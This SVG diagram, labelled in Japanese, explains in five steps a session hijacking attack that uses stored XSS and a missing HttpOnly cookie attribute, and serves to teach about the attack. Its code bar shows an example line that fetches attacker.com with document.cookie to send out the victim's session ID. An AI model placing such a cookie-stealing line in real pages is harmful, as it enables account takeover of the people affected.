<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1100 750" font-family="'Segoe UI', 'Helvetica Neue', Arial, sans-serif">
  <defs>
    <linearGradient id="bgGrad" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#0f172a"/>
      <stop offset="100%" stop-color="#1e293b"/>
    </linearGradient>
    <filter id="glow">
      <feGaussianBlur stdDeviation="2.5" result="blur"/>
      <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
    </filter>
    <filter id="shadow">
      <feDropShadow dx="0" dy="2" stdDeviation="4" flood-color="#000" flood-opacity="0.35"/>
    </filter>
    <marker id="arrowRed" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#ef4444"/>
    </marker>
    <marker id="arrowBlue" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#3b82f6"/>
    </marker>
    <marker id="arrowPurple" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#a855f7"/>
    </marker>
  </defs>

  <!-- Background -->
  <rect width="1100" height="750" fill="url(#bgGrad)" rx="12"/>

  <!-- ===== Title ===== -->
  <text x="380" y="38" text-anchor="middle" fill="#f8fafc" font-size="22" font-weight="700">Session Hijacking Attack Flow</text>
  <text x="380" y="58" text-anchor="middle" fill="#94a3b8" font-size="12">セッションハイジャック — XSSでCookieを盗みなりすます</text>
  <rect x="278" y="66" width="204" height="20" rx="10" fill="#ef4444" opacity="0.15"/>
  <text x="380" y="80" text-anchor="middle" fill="#fca5a5" font-size="10" font-weight="600">OWASP A07 — Auth Failures</text>

  <!-- ====================================================== -->
  <!--  ACTORS                                                 -->
  <!-- ====================================================== -->

  <!-- Attacker -->
  <g transform="translate(115, 250)" filter="url(#shadow)">
    <rect x="-56" y="-30" width="112" height="125" rx="12" fill="#1e1b2e" stroke="#ef4444" stroke-width="1.5"/>
    <g transform="translate(0, 10)">
      <path d="M-13,-17 Q0,-28 13,-17 L13,-4 Q0,2 -13,-4 Z" fill="none" stroke="#ef4444" stroke-width="1.8"/>
      <circle cx="-4" cy="-9" r="1.8" fill="#ef4444"/>
      <circle cx="4" cy="-9" r="1.8" fill="#ef4444"/>
      <path d="M-17,36 Q-17,14 0,10 Q17,14 17,36" fill="none" stroke="#ef4444" stroke-width="2"/>
      <line x1="-17" y1="36" x2="17" y2="36" stroke="#ef4444" stroke-width="2" stroke-linecap="round"/>
    </g>
    <text x="0" y="72" text-anchor="middle" fill="#fca5a5" font-size="13" font-weight="700">攻撃者</text>
    <text x="0" y="86" text-anchor="middle" fill="#ef4444" font-size="9.5" opacity="0.7">attacker.com</text>
  </g>

  <!-- Victim -->
  <g transform="translate(380, 250)" filter="url(#shadow)">
    <rect x="-56" y="-30" width="112" height="125" rx="12" fill="#1e1b2e" stroke="#a855f7" stroke-width="1.5"/>
    <g transform="translate(0, 10)">
      <circle cx="0" cy="-9" r="13" fill="none" stroke="#a855f7" stroke-width="1.8"/>
      <circle cx="-4" cy="-11" r="1.5" fill="#a855f7"/>
      <circle cx="4" cy="-11" r="1.5" fill="#a855f7"/>
      <path d="M-4,-4 Q0,1 4,-4" fill="none" stroke="#a855f7" stroke-width="1.3" stroke-linecap="round"/>
      <path d="M-17,36 Q-17,14 0,10 Q17,14 17,36" fill="none" stroke="#a855f7" stroke-width="2"/>
      <line x1="-17" y1="36" x2="17" y2="36" stroke="#a855f7" stroke-width="2" stroke-linecap="round"/>
    </g>
    <text x="0" y="72" text-anchor="middle" fill="#d8b4fe" font-size="13" font-weight="700">被害者</text>
    <text x="0" y="86" text-anchor="middle" fill="#a855f7" font-size="9.5" opacity="0.7">ログイン中</text>
  </g>

  <!-- Web Server -->
  <g transform="translate(645, 250)" filter="url(#shadow)">
    <rect x="-56" y="-30" width="112" height="125" rx="12" fill="#1e1b2e" stroke="#3b82f6" stroke-width="1.5"/>
    <g transform="translate(0, 14)">
      <rect x="-20" y="-18" width="40" height="12" rx="3" fill="none" stroke="#3b82f6" stroke-width="1.5"/>
      <circle cx="-12" cy="-12" r="2" fill="#3b82f6"/><circle cx="-5" cy="-12" r="2" fill="#3b82f6"/>
      <rect x="-20" y="-2" width="40" height="12" rx="3" fill="none" stroke="#3b82f6" stroke-width="1.5"/>
      <circle cx="-12" cy="4" r="2" fill="#3b82f6"/><circle cx="-5" cy="4" r="2" fill="#3b82f6"/>
      <rect x="-20" y="14" width="40" height="12" rx="3" fill="none" stroke="#3b82f6" stroke-width="1.5"/>
      <circle cx="-12" cy="20" r="2" fill="#3b82f6"/><circle cx="-5" cy="20" r="2" fill="#3b82f6"/>
    </g>
    <text x="0" y="72" text-anchor="middle" fill="#93c5fd" font-size="13" font-weight="700">Webサーバー</text>
    <text x="0" y="86" text-anchor="middle" fill="#3b82f6" font-size="9.5" opacity="0.7">target.com</text>
  </g>

  <!-- ====================================================== -->
  <!--  ARROWS                                                 -->
  <!-- ====================================================== -->

  <!-- Step 1: Attacker → Server (upper) — XSSスクリプトを投稿 -->
  <path d="M 171 240 Q 380 160 589 240" fill="none" stroke="#ef4444" stroke-width="2.2" stroke-dasharray="8,4" marker-end="url(#arrowRed)" filter="url(#glow)"/>
  <circle cx="380" cy="170" r="16" fill="#ef4444"/>
  <text x="380" y="175" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">1</text>
  <text x="380" y="160" text-anchor="middle" fill="#fca5a5" font-size="9.5" font-weight="600">XSSスクリプト投稿</text>

  <!-- Step 2: Victim → Server (Y=282) — コメント一覧を閲覧 -->
  <path d="M 436 282 L 589 282" fill="none" stroke="#a855f7" stroke-width="2.2" marker-end="url(#arrowPurple)"/>
  <circle cx="514" cy="304" r="16" fill="#a855f7"/>
  <text x="514" y="309" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">2</text>
  <text x="514" y="322" text-anchor="middle" fill="#d8b4fe" font-size="9.5" font-weight="600">ページ閲覧</text>

  <!-- Step 3: Server → Victim (Y=250, return with XSS) — XSS含むHTML返却 -->
  <path d="M 589 250 L 436 250" fill="none" stroke="#3b82f6" stroke-width="2.2" marker-end="url(#arrowBlue)"/>
  <circle cx="514" cy="228" r="16" fill="#3b82f6"/>
  <text x="514" y="233" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">3</text>
  <text x="514" y="218" text-anchor="middle" fill="#93c5fd" font-size="9.5" font-weight="600">XSS含むHTML返却</text>

  <!-- Step 4: Victim → Attacker (lower curve) — Cookie送信 document.cookie -->
  <path d="M 324 310 Q 250 400 171 310" fill="none" stroke="#ef4444" stroke-width="2.2" stroke-dasharray="8,4" marker-end="url(#arrowRed)" filter="url(#glow)"/>
  <circle cx="248" cy="380" r="16" fill="#ef4444"/>
  <text x="248" y="385" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">4</text>
  <text x="200" y="400" text-anchor="middle" fill="#fca5a5" font-size="9.5" font-weight="600">Cookie窃取・送信</text>

  <!-- Step 5: Attacker → Server (bottom large curve) — 盗んだIDでアクセス -->
  <path d="M 171 345 Q 380 560 589 345" fill="none" stroke="#ef4444" stroke-width="2.2" stroke-dasharray="8,4" marker-end="url(#arrowRed)" filter="url(#glow)"/>
  <circle cx="380" cy="520" r="16" fill="#ef4444"/>
  <text x="380" y="525" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">5</text>
  <text x="380" y="546" text-anchor="middle" fill="#fca5a5" font-size="9.5" font-weight="600">盗んだIDでなりすまし</text>

  <!-- ===== Vulnerability callout ===== -->
  <g transform="translate(380, 430)" filter="url(#shadow)">
    <rect x="-140" y="-18" width="280" height="62" rx="8" fill="#451a03" stroke="#f97316" stroke-width="1"/>
    <text x="0" y="-1" text-anchor="middle" fill="#fdba74" font-size="11" font-weight="700">⚠ 脆弱性: HttpOnly属性なし + XSS</text>
    <text x="0" y="16" text-anchor="middle" fill="#fb923c" font-size="9.5" font-family="'Fira Code', monospace">document.cookie → "session_id=abc123"</text>
    <text x="0" y="32" text-anchor="middle" fill="#fed7aa" font-size="9">JavaScriptからCookieにアクセス可能</text>
  </g>

  <!-- ===== Code example bar ===== -->
  <g transform="translate(380, 580)">
    <rect x="-215" y="-14" width="430" height="28" rx="5" fill="#0f172a" stroke="#334155" stroke-width="1"/>
    <text x="0" y="4" text-anchor="middle" fill="#94a3b8" font-size="9.5" font-family="'Fira Code', monospace">
      <tspan fill="#ef4444">fetch</tspan><tspan fill="#94a3b8">(</tspan><tspan fill="#22c55e">'http://attacker.com/steal?c='</tspan><tspan fill="#94a3b8">+</tspan><tspan fill="#ef4444">document.cookie</tspan><tspan fill="#94a3b8">)</tspan>
    </text>
  </g>

  <!-- ====================================================== -->
  <!--  STEP LIST (right sidebar)                              -->
  <!-- ====================================================== -->
  <g transform="translate(775, 100)">
    <rect x="0" y="0" width="305" height="320" rx="10" fill="#0f172a" stroke="#334155" stroke-width="1"/>
    <text x="152" y="28" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="700">攻撃ステップ詳細</text>
    <line x1="16" y1="40" x2="289" y2="40" stroke="#334155" stroke-width="1"/>

    <!-- Step 1 -->
    <circle cx="34" cy="68" r="13" fill="#ef4444"/>
    <text x="34" y="73" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">1</text>
    <text x="56" y="64" fill="#f8fafc" font-size="11.5" font-weight="600">XSSスクリプトを投稿</text>
    <text x="56" y="80" fill="#94a3b8" font-size="9.5">Cookie窃取スクリプトを含む</text>
    <text x="56" y="93" fill="#94a3b8" font-size="9.5">コメントをStored XSSで保存</text>

    <!-- Step 2 -->
    <circle cx="34" cy="124" r="13" fill="#a855f7"/>
    <text x="34" y="129" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">2</text>
    <text x="56" y="120" fill="#f8fafc" font-size="11.5" font-weight="600">被害者がページを閲覧</text>
    <text x="56" y="136" fill="#94a3b8" font-size="9.5">被害者がコメント一覧ページを</text>
    <text x="56" y="149" fill="#94a3b8" font-size="9.5">開き、悪意のあるHTMLを取得</text>

    <!-- Step 3 -->
    <circle cx="34" cy="180" r="13" fill="#3b82f6"/>
    <text x="34" y="185" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">3</text>
    <text x="56" y="176" fill="#f8fafc" font-size="11.5" font-weight="600">XSS含むHTML返却</text>
    <text x="56" y="192" fill="#94a3b8" font-size="9.5">サーバーがスクリプトを含む</text>
    <text x="56" y="205" fill="#94a3b8" font-size="9.5">HTMLをそのまま返却する</text>

    <!-- Step 4 -->
    <circle cx="34" cy="236" r="13" fill="#ef4444"/>
    <text x="34" y="241" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">4</text>
    <text x="56" y="232" fill="#f8fafc" font-size="11.5" font-weight="600">Cookie窃取・外部送信</text>
    <text x="56" y="248" fill="#94a3b8" font-size="9.5">document.cookieでセッションIDを</text>
    <text x="56" y="261" fill="#94a3b8" font-size="9.5">読み取り攻撃者サーバーに送信</text>

    <!-- Step 5 -->
    <circle cx="34" cy="292" r="13" fill="#ef4444"/>
    <text x="34" y="297" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">5</text>
    <text x="56" y="288" fill="#f8fafc" font-size="11.5" font-weight="600">セッションIDでなりすまし</text>
    <text x="56" y="304" fill="#94a3b8" font-size="9.5">攻撃者が窃取したIDで</text>
    <text x="56" y="317" fill="#94a3b8" font-size="9.5">被害者としてサーバーにアクセス</text>
  </g>

  <!-- ====================================================== -->
  <!--  ATTACK TECHNIQUE CARDS                                 -->
  <!-- ====================================================== -->
  <line x1="30" y1="660" x2="1070" y2="660" stroke="#334155" stroke-width="1"/>
  <text x="550" y="685" text-anchor="middle" fill="#fca5a5" font-size="14" font-weight="700">使用される攻撃テクニック</text>

  <!-- Card: Stored XSS -->
  <g transform="translate(165, 698)" filter="url(#shadow)">
    <rect x="-120" y="0" width="240" height="38" rx="8" fill="#1e1b2e" stroke="#ef4444" stroke-width="1"/>
    <rect x="-108" y="6" width="28" height="26" rx="5" fill="#ef4444" opacity="0.1"/>
    <g transform="translate(-94, 19)">
      <text x="0" y="4" text-anchor="middle" fill="#ef4444" font-size="10" font-weight="700">&lt;/&gt;</text>
    </g>
    <text x="10" y="16" text-anchor="middle" fill="#f8fafc" font-size="11" font-weight="600">Stored XSS</text>
    <text x="10" y="30" text-anchor="middle" fill="#94a3b8" font-size="8.5">永続化されたスクリプト注入</text>
  </g>

  <!-- Card: Cookie窃取 -->
  <g transform="translate(465, 698)" filter="url(#shadow)">
    <rect x="-120" y="0" width="240" height="38" rx="8" fill="#1e1b2e" stroke="#ef4444" stroke-width="1"/>
    <rect x="-108" y="6" width="28" height="26" rx="5" fill="#ef4444" opacity="0.1"/>
    <g transform="translate(-94, 19)">
      <circle cx="0" cy="0" r="7" fill="none" stroke="#ef4444" stroke-width="1.2"/>
      <circle cx="-3" cy="-2" r="1.5" fill="#ef4444"/>
      <circle cx="3" cy="1" r="1.5" fill="#ef4444"/>
    </g>
    <text x="10" y="16" text-anchor="middle" fill="#f8fafc" font-size="11" font-weight="600">document.cookie窃取</text>
    <text x="10" y="30" text-anchor="middle" fill="#94a3b8" font-size="8.5">HttpOnlyなしでJS読み取り可</text>
  </g>

  <!-- Card: セッション乗っ取り -->
  <g transform="translate(765, 698)" filter="url(#shadow)">
    <rect x="-120" y="0" width="240" height="38" rx="8" fill="#1e1b2e" stroke="#ef4444" stroke-width="1"/>
    <rect x="-108" y="6" width="28" height="26" rx="5" fill="#ef4444" opacity="0.1"/>
    <g transform="translate(-94, 19)">
      <circle cx="-3" cy="-2" r="5" fill="none" stroke="#ef4444" stroke-width="1"/>
      <circle cx="3" cy="2" r="5" fill="none" stroke="#ef4444" stroke-width="1"/>
    </g>
    <text x="10" y="16" text-anchor="middle" fill="#f8fafc" font-size="11" font-weight="600">セッション乗っ取り</text>
    <text x="10" y="30" text-anchor="middle" fill="#94a3b8" font-size="8.5">窃取IDで被害者になりすまし</text>
  </g>

  <!-- ===== Legend ===== -->
  <g transform="translate(775, 445)">
    <rect x="0" y="0" width="305" height="68" rx="6" fill="#0f172a" stroke="#334155" stroke-width="1"/>
    <text x="14" y="18" fill="#94a3b8" font-size="10" font-weight="600">凡例</text>
    <line x1="14" y1="34" x2="44" y2="34" stroke="#ef4444" stroke-width="2" stroke-dasharray="6,3"/>
    <text x="52" y="38" fill="#fca5a5" font-size="9.5">攻撃通信</text>
    <line x1="152" y1="34" x2="182" y2="34" stroke="#3b82f6" stroke-width="2"/>
    <text x="190" y="38" fill="#93c5fd" font-size="9.5">サーバー応答</text>
    <line x1="14" y1="54" x2="44" y2="54" stroke="#a855f7" stroke-width="2"/>
    <text x="52" y="58" fill="#d8b4fe" font-size="9.5">ユーザー通信</text>
    <rect x="152" y="48" width="12" height="12" rx="2" fill="#451a03" stroke="#f97316" stroke-width="0.8"/>
    <text x="170" y="58" fill="#fdba74" font-size="9.5">脆弱性ポイント</text>
  </g>

</svg>
